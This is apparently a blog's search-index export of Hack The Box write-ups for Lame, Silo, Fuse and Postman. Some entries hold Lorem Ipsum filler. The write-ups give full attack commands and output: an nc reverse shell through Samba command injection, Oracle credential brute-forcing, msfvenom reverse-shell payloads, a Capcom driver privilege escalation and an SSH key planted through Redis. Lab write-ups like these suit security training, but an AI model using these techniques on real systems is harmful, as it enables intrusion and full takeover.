\\\\\\\\10.10.10.3\\\\tmp\\\\\nsmb: \\&gt; ?\n  [..]\n  wdel           logon          listconnect    showconnect    tcon\n(b) Setup a reverse shell to your box\nsmb: \\&gt; logon \"./=`nohup nc -e /bin/sh 10.10.14.10 4488`\"\n  Password:\n  session setup failed: NT_STATUS_IO_TIMEOUT\n(c) Grab the incomming session\n[root:/git/htb/lame]# nc -lvnp 4488                                                                                               (master✱)\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.10.3] 58543\n  whoami\n  root\n  python -c 'import pty;pty.spawn(\"/bin/bash\")';\n  root@lame:/root# cat root.txt\n    cat root.txt\n    744e9fa96f4e8423020ccb841c60e4d2"
  },
  {
    "objectID": "posts/2019-05-15-htb-writeup-swagshop/2019-05-15-htb-writeup-swagshop.html",
    "href": "posts/2019-05-15-htb-writeup-swagshop/2019-05-15-htb-writeup-swagshop.html",
    "title": "Swagshop - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2020-03-28-htb-writeup-silo/2020-03-28-htb-writeup-silo.html",
    "href": "posts/2020-03-28-htb-writeup-silo/2020-03-28-htb-writeup-silo.html",
    "title": "Silo - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/silo]# nmap -Pn -n -sCV 10.10.10.82 –open (master✱) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open oracle-tns Oracle TNS listener (requires service name) 49161/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\nHost script results: |clock-skew: mean: 3m40s, deviation: 0s, median: 3m39s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported | message_signing: supported | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-03-03T14:54:11 |_ start_date: 2021-03-03T14:50:28\n\nRPCCLIENT: -U ““: Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE\nSMBCLIENT: anonymous: session setup failed: NT_STATUS_LOGON_FAILURE\nDIRB: ==&gt; DIRECTORY: http://10.10.10.82/aspnet_client/ ==&gt; DIRECTORY: http://10.10.10.82/aspnet_client/system_web/\nNIKTO: + Server: Microsoft-IIS/8.5 + Retrieved x-aspnet-version header: 4.0.30319 + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST\n\nLooking through the nmap output we see port 1521, ‘Oracle TNS listener 11.2.0.2.0 (unauthorized)’. This sounds like a good start. Searching for Oracle TNS exploits we come across a post from HackTricks, teaching us the steps to take when testing the service.\n\n\nEnumerate version info (search for known vulns)\nBruteforce TNS listener communication (not always needed)\nEnumerate/Bruteforce SID names (like database names)\nBruteforce credentials for valid SID name discovered\nTry to execute code\n\nAs we already know the version (11.2.0.2.0) we can jump straight to step c, Bruteforce SID names. [root:/git/htb/silo]# hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid (master✱) Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-03 16:03:34\n  [DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:576/p:1), ~36 tries per task\n  [DATA] attacking oracle-sid://10.10.10.82:1521/\n  [1521][oracle-sid] host: 10.10.10.82   login: XE\n  [1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc\n  [1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc\n  [1521][oracle-sid] host: 10.10.10.82\n  1 of 1 target successfully completed, 4 valid passwords found\n\nWe find four SIDs: XE, PLSExtProc, CLRExtProc, &lt;blank&gt;\n\nNext we need to bruteforce credentials (step d). We can use either msf or nmap for this, so obviously we go for nmap. [root:/git/htb/silo]# nmap –script=oracle-brute –script-args=oracle-brute.sid=XE 10.10.10.82 -p 1521 (master✱) PORT STATE SERVICE 1521/tcp open oracle | oracle-brute: | Accounts: | CTXSYS:CTXSYS - Account is locked | MDSYS:MDSYS - Account is locked | OUTLN:OUTLN - Account is locked | HR:HR - Account is locked | DBSNMP:DBSNMP - Account is locked | DIP:DIP - Account is locked | XDB:CHANGE_ON_INSTALL - Account is locked |_ Statistics: Performed 695 guesses in 15 seconds, average tps: 46.3\nNothing.. lets download the user- and password-list from HackTricks and run the script again.\n[root:/git/htb/silo]# nmap –script=oracle-brute –script-args=oracle-brute.sid=XE,userdb=/git/htb/silo/users-oracle.txt,passdb=/git/htb/silo/pass-oracle.txt 10.10.10.82 -p 1521 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 16:58 CET PORT STATE SERVICE 1521/tcp open oracle | oracle-brute: | Accounts: | ctxsys:ctxsys - Account is locked | outln:outln - Account is locked | OUTLN:outln - Account is locked | MDSYS:mdsys - Account is locked | xdb:xdb - Account is locked | system:06071992 - Account is locked | XDB:xdb - Account is locked | SYSTEM:06071992 - Account is locked | SCOTT:0racl3 - Account is locked | mdsys:mdsys - Account is locked | hr:hr - Account is locked | DBSNMP:dbsnmp - Account is locked | CTXSYS:ctxsys - Account is locked | HR:hr - Account is locked | dbsnmp:dbsnmp - Account is locked | DIP:dip - Account is locked | dip:dip - Account is locked | scott:0RACL3 - Account is locked |_ Statistics: Performed 110942 guesses in 900 seconds, average tps: 99.0\nNo luck there either.. continue to read on about pentesting Oracle Databases and come across the software Odat, lets try it.\n[root:/opt/odat]# python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE (master✱) [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 100% |######################################################################################################################| Time: 00:11:14 [-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option ‘–accounts-file accounts/accounts_multiple.txt’ or ‘–accounts-files accounts/logins.txt accounts/pwds.txt’\nTesting the other wordlists with Odat doesn’t give anything either.. lets try steal the one msf uses. Look at the formating of a random Odat wordlist, to make the msf alike.\n[root:/opt/odat]# head accounts/accounts_small.txt (master-python3✱) anonymous/anonymous applsys/applsys apps/apps\n[root:/opt/odat]# head /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (master-python3✱) brio_admin brio_admin brugernavn adgangskode brukernavn password\nSo we need to change space to /, and run again with the new wordlist. [root:/opt/odat]# python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE –accounts-file accounts/msf-list.txt (master-python3✱) [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 [!] Notice: ‘ctxsys’ account is locked, so skipping this username for password | ETA: 00:05:13 [!] Notice: ‘hr’ account is locked, so skipping this username for password | ETA: 00:04:49 [!] Notice: ‘mdsys’ account is locked, so skipping this username for password | ETA: 00:03:45 [!] Notice: ‘dbsnmp’ account is locked, so skipping this username for password | ETA: 00:03:04 [!] Notice: ‘dip’ account is locked, so skipping this username for password | ETA: 00:02:57 [!] Notice: ‘system’ account is locked, so skipping this username for password | ETA: 00:02:06 [!] Notice: ‘xdb’ account is locked, so skipping this username for password | ETA: 00:01:15 [!] Notice: ‘outln’ account is locked, so skipping this username for password | ETA: 00:00:59 [!] Notice: ‘scott’ account is locked, so skipping this username for password | ETA: 00:00:11 100% |######################################################################################################################| Time: 00:04:52 [-] No found a valid account on 10.10.10.82:1521/sid:XE. You should try with the option ‘–accounts-file accounts/accounts_multiple.txt’ or ‘–accounts-files accounts/logins.txt accounts/pwds.txt’\nReset the box and try again, BOOM! [root:/opt/odat]# python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE –accounts-file accounts/msf-list.txt (master-python3✱) [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 — snip — [+] Accounts found on 10.10.10.82:1521/sid:XE: scott/tiger\nWe got credentials, scott/tiger, so lastly we exploit. Reading the documentation on HackTricks we can both Write files and Execude code, maybe we can get a reverse shell?\n\nWrite files: ./odat.py utlfile -s  -d  -U  -P  –getFile “C:/test” token.txt token.txt\nRead files: ./odat.py externaltable -s  -U  -P  -d  –getFile “C:/test” “my4.txt” “my”\nExecute code via External Tables: ./odat.py externaltable -s  -U  -P  -d  –exec “C:/windows/system32” “calc.exe”\nCreate a payload, and upload it.\n[root:/git/htb/silo]# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4488 -f exe -o silo-rev.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: silo-rev.exe\n[root:/opt/odat]# python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger –putFile C:/ silo-rev.exe /git/htb/silo/silo-rev.exe [1] (10.10.10.82:1521): Put the /git/htb/silo/silo-rev.exe local file in the C:/ folder like silo-rev.exe on the 10.10.10.82 server [-] Impossible to put the /git/htb/silo/silo-rev.exe file: ORA-01031: insufficient privileges\nOur privileges are to low. This error can be avoided by signing on “as sysdba”, luckily there is a –sysdba flag in odat.\n[root:/opt/odat]# python3 odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger –sysdba –putFile C:/ silo-rev.exe /git/htb/silo/silo-rev.exe [1] (10.10.10.82:1521): Put the /git/htb/silo/silo-rev.exe local file in the C:/ folder like silo-rev.exe on the 10.10.10.82 server [+] The /git/htb/silo/silo-rev.exe file was created on the C:/ directory on the 10.10.10.82 server like the silo-rev.exe file\n[root:/opt/odat]# python3 odat.py externaltable -s 10.10.10.82 -U scott -P tiger -d XE –sysdba –exec c:/ silo-rev.exe [1] (10.10.10.82:1521): Execute the silo-rev.exe command stored in the c:/ path\n[root:/git/htb/silo]# rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.82] 49163 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved.\nC:\\oraclexe\\app\\oracle\\product\\11.2.0\\server\\DATABASE&gt; whoami\n  nt authority\\system\n\nC:\\oraclexe\\app\\oracle\\product\\11.2.0\\server\\DATABASE&gt; cd C:\\Users\nC:\\Users&gt; type Phineas\\Desktop\\user.txt\n  92ede778a1cc8d27cb6623055c331617\nC:\\Users&gt; type Administrator\\Desktop\\root.txt\n  cd39ea0af657a495e33bc59c7836faf6\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nHacking Oracle TNS Listener: https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener\nNMAP Oracle Brute: https://nmap.org/nsedoc/scripts/oracle-brute.html https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/\nOdat: https://github.com/quentinhardy/odat http://www.dba-oracle.com/t_ora_01031_insufficient_privileges.htm"
  },
  {
    "objectID": "posts/2020-09-01-htb-writeup-fuse/2020-09-01-htb-writeup-fuse.html",
    "href": "posts/2020-09-01-htb-writeup-fuse/2020-09-01-htb-writeup-fuse.html",
    "title": "Fuse - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb# nmap -Pn -n fuse.htb PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49666/tcp open unknown 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49680/tcp open unknown 49698/tcp open unknown 49754/tcp open unknown\nDIRB:\n\nhttp://10.10.10.193/index.htm (CODE:200|SIZE:103)\n\nNIKTO:\n\nServer: Microsoft-IIS/10.0\n\nVisiting the page http://10.10.10.193 forwards us to http://fuse.fabricorp.local/papercut/logs/html/index.htm, lets add that to /etc/hosts and refresh the page.\nWe are now presented to PaperCut - Print Logger. There are logs from three dates; May 29th 17:50, User: pmerton, Document: New Starter - bnielson - Notepad 17:53, User: tlavel May 30th All prints are from user sthompson June 10th 17:40, User: bhult 19:18, User administrator\nFrom the logs we find 6 usernames, add them all to a list. From the document name we can guess that bnielson is a new employee. With a user-list we are able to look for password hashes with Impacket GetNPUsers, if Preauth is set - however in this case it is not. We are able to login with RPCCLIENT as anonymous, however we are unable to extract any information.\nAs nothing seems to work, I went to cewl to create a custom word list and spray passwords on the SMB service. This didn’t work either, but I noticed cewl didn’t take any words from the logs. So I created my own wordlist, by hand, and tried spraying again\n\nand voila!\n\nroot@nidus:/git/htb/fuse# cat words.txt pmerton HP-MFT01 New Starter bnielson Notepad JUMP01 tlavel IT Budget Meeting Minutes LONWK015 sthompson backup_tapes mega_mountain_tape_request Fabricorp01 Word offsite_dr_invocation printing_issue_test invocation printing issue test\nmsf5 &gt; use auxiliary/scanner/smb/smb_login msf5 auxiliary(scanner/smb/smb_login) &gt; set user_file users.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set pass_file words.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set smbdomain fabricorp.local msf5 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.10.10.193 msf5 auxiliary(scanner/smb/smb_login) &gt; run\n[*] 10.10.10.193:445 - 10.10.10.193:445 - Starting SMB login bruteforce .. [+] 10.10.10.193:445 - 10.10.10.193:445 - Success: ‘fabricorp.local:Fabricorp01’ [+] 10.10.10.193:445 - 10.10.10.193:445 - Success: ‘fabricorp.local:Fabricorp01’ [+] 10.10.10.193:445 - 10.10.10.193:445 - Success: ‘fabricorp.local:Fabricorp01’\nThis is where things got tricky.. we have 3 sets of creds but I seems we can’t use them for anything good. So back to enumeration, this time more thorough.\nSMBCLIENT: root@nidus:/git/htb/fuse# smbclient -L 10.10.10.193 -U bnielson session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE root@nidus:/git/htb/fuse# smbclient -L 10.10.10.193 -U tlavel session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE root@nidus:/git/htb/fuse# smbclient -L 10.10.10.193 -U bhult session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE\nRPCCLIENT: root@nidus:/git/htb/fuse# rpcclient -U bnielson 10.10.10.193 Cannot connect to server. Error was NT_STATUS_PASSWORD_MUST_CHANGE root@nidus:/git/htb/fuse# rpcclient -U tlavel 10.10.10.193 Cannot connect to server. Error was NT_STATUS_PASSWORD_MUST_CHANGE root@nidus:/git/htb/fuse# rpcclient -U bhult 10.10.10.193 Cannot connect to server. Error was NT_STATUS_PASSWORD_MUST_CHANGE\nEvil-WinRM - Nope. Impacket-secretsdump - Nope, not possible that either..\nAfter a lot of enumeration and random attempts to find something, I finally managed to move on by changing the user password with smbpasswd. The password change is very brief and rolled back after about a minute, so you have to be quick enumerating once changed.\nroot@nidus:/git/htb/fuse# smbpasswd -r 10.10.10.193 -U bnielson Old SMB password: New SMB password: Retype new SMB password: Password changed for user bnielson on 10.10.10.193.\nAt first I went through SMB, there are some shares but nothing of use, so I went back to RPCCLIENT. We are able to extract more data, and a hidden password in the printer description (!!)\nrpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[svc-print] rid:[0x450] user:[bnielson] rid:[0x451] user:[sthompson] rid:[0x641] user:[tlavel] rid:[0x642] user:[pmerton] rid:[0x643] user:[svc-scan] rid:[0x645] user:[bhult] rid:[0x1bbd] user:[dandrews] rid:[0x1bbe] user:[mberbatov] rid:[0x1db1] user:[astein] rid:[0x1db2] user:[dmuir] rid:[0x1db3]\nrpcclient $&gt; enumprinters flags:[0x800000] name:[\\10.10.10.193-MFT01] author: “0xPThree” description:[\\10.10.10.193-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)] comment:[]\nAdd the new users to your list and try to spray again towards SMB and WinRM.\nSMB doesn’t work, and neither do the msf-module winrm_login. However I’ve previously built a dirty Evil-WinRM login script that did give us access.\nroot@nidus:/git/htb/fuse# ./evil-login.sh 10.10.10.193 creds.txt Testing credentials ’svc-print:$fab@s3Rv1ce$1\nEvil-WinRM shell v2.3 Info: Establishing connection to remote endpoint\nEvil-WinRM PS C:-print&gt; whoami fabricorp-print Evil-WinRM PS C:-print&gt; type ../Desktop/user.txt 47863580fe3b92e48cf8363d4756743f\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nStandard enumeration shows us that the user has some unusual privileges, googling about them we find one can be used for privesc.\nEvil-WinRM PS C:-print&gt; whoami /all\n[..]\nPRIVILEGES INFORMATION ———————-\nPrivilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled\nOne page tells us: “SeLoadDriverPrivilege - A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka NT”\nWe can exploit this using the PoC “EoPLoadDriver” in combination with the malicious “ExploitCapcom”, both found on Github.\nFIRST:\n\n\nDownload https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys\nDownload https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp\nDownload https://github.com/tandasat/ExploitCapcom\nEdit ExploitCapcom.cpp line 292 TCHAR CommandLine[] = TEXT(“C:\\Windows\\system32\\cmd.exe”); to TCHAR CommandLine[] = TEXT(“C:\\temp\\p3-rev.exe”); then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe (I did not succeed to do this in Kali, did it in Windows using Visual Studio 2019)\n1&gt;------ Build started: Project: ExploitCapcom, Configuration: Debug x64 ------\n1&gt;stdafx.cpp\n1&gt;ExploitCapcom.cpp\n1&gt;ExploitCapcom.vcxproj -&gt; C:\\Users\\PlayerThree\\Downloads\\ExploitCapcom-master\\ExploitCapcom\\x64\\Debug\\ExploitCapcom.exe\n1&gt;ExploitCapcom.vcxproj -&gt; C:\\Users\\PlayerThree\\Downloads\\ExploitCapcom-master\\ExploitCapcom\\x64\\Debug\\ExploitCapcom.pdb (Full PDB)\n========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========\n\n1&gt;------ Build started: Project: EOPLOADDRIVER, Configuration: Debug Win32 ------\n1&gt;EOPLOADDRIVER.cpp\n1&gt;EOPLOADDRIVER.vcxproj -&gt; C:\\Users\\PlayerThree\\source\\repos\\EOPLOADDRIVER\\Debug\\EOPLOADDRIVER.exe\n========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========\n\nSECOND: - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe &gt; msf-rev.exe - Upload all the files; – Invoke-WebRequest -Uri “http://10.10.14.12:8080/Capcom.sys” -Outfile “Capcom.sys” – Invoke-WebRequest -Uri “http://10.10.14.12:8080/EOPLOADDRIVER.exe” -Outfile “EOPLOADDRIVER.exe” – Invoke-WebRequest -Uri “http://10.10.14.12:8080/msf-rev.exe” -Outfile “msf-rev.exe” – Invoke-WebRequest -Uri “http://10.10.14.12:8080/p3-rev.exe” -Outfile “p3-rev.exe”\n*Evil-WinRM* PS C:\\temp&gt; dir\n\n  Mode                LastWriteTime         Length Name\n  ----                -------------         ------ ----\n  -a----         9/9/2020  11:45 AM          10576 Capcom.sys\n  -a----         9/9/2020  11:56 AM          15360 EOPLOADDRIVER.exe\n  -a----         9/9/2020  12:04 PM        1807360 msf-rev.exe\n  -a----         9/9/2020  12:02 PM          73802 p3-rev.exe\n\nNOTE: I changed name of ExploitCapcom.exe to msf-rev.exe.\n\nExecute your payload and grab root.txt\n..exe SystemC:.sys .-rev.exe\nmsf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set lhost 10.10.14.12 msf5 exploit(multi/handler) &gt; set lport 4488 msf5 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 10.10.14.12:4488 [*] Sending stage (176195 bytes) to 10.10.10.193 [*] Meterpreter session 1 opened (10.10.14.12:4488 -&gt; 10.10.10.193:52069) at 2020-09-09 22:46:22 +0200\nmeterpreter &gt; shell Process 2464 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved.\nC:&gt;whoami whoami nt authority\nC:&gt;type C:.txt 5ff71b93d969feae3416be2294f948fe\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nsmbpasswd https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html\nCapcom Privesc https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges https://github.com/TarlogicSecurity/EoPLoadDriver/ https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom/ExploitCapcom https://red-team.ir/tips-and-tricks"
  },
  {
    "objectID": "posts/2019-11-08-htb-writeup-postman/2019-11-08-htb-writeup-postman.html",
    "href": "posts/2019-11-08-htb-writeup-postman/2019-11-08-htb-writeup-postman.html",
    "title": "Postman - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n postman.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: The Cyber Geek’s Personal Website 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn’t have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nnmap -Pn -sV -n -p- postman.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd)\nnmap -Pn -sV -n -sU postman.htb PORT STATE SERVICE VERSION 10000/udp open webmin (https on TCP port 10000)\n\nEnumerate port 80/10000 with dirb and nikto loot: .. http://postman.htb/css/ .. http://postman.htb/fonts/ .. http://postman.htb/images/ .. http://postman.htb/js/ .. http://postman.htb/upload/ .. https://postman.htb:10000/\nRedis on port 6379 seems to be unauthenticated, we can reach it using redic-cli -h postman.htb This can be exploited to give us a reverse shell uploading our public key to authorized_keys. We can either do this manually, or automatically with the script redis.py (https://github.com/Avinash-acid/Redis-Server-Exploit)\n— MANUALLY — root@p3:/opt/htb/machines/postman# ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): postman-id_rsa Enter passphrase (empty for no passphrase): (blank) Enter same passphrase again: (blank) Your identification has been saved in postman-id_rsa. Your public key has been saved in postman-id_rsa.pub. The key fingerprint is: SHA256:JNjykISF8kNnxmrqE9LuEAruVeV7AKpiSIKJJZrWhCw root@p3 The key’s randomart image is: +—[RSA 3072]—-+ | =o | |o =.=+ | |E.=.o.. | |==B .++o | |X* + ..oS | |@oo . o | |B=.. . . | |++o . | | oo | +—-[SHA256]—–+\nroot@p3:/opt/htb/machines/postman# (echo -e “”; cat postman-id_rsa.pub; echo -e “”) &gt; postman-pub.txt\nroot@p3:/opt/htb/machines/postman# cat postman-pub.txt | redis-cli -h postman.htb -x set p3-key OK\nroot@p3:/opt/htb/machines/postman# redis-cli -h postman.htb postman.htb:6379&gt; config set dir /var/lib/redis/.ssh OK postman.htb:6379&gt; config get dir 1) “dir” 2) “/var/lib/redis/.ssh” postman.htb:6379&gt; keys * 1) “cracklist” 2) “p3-key” postman.htb:6379&gt; config set dbfilename “authorized_keys” OK postman.htb:6379&gt; save OK\nroot@p3:/opt/htb/machines/postman# ssh 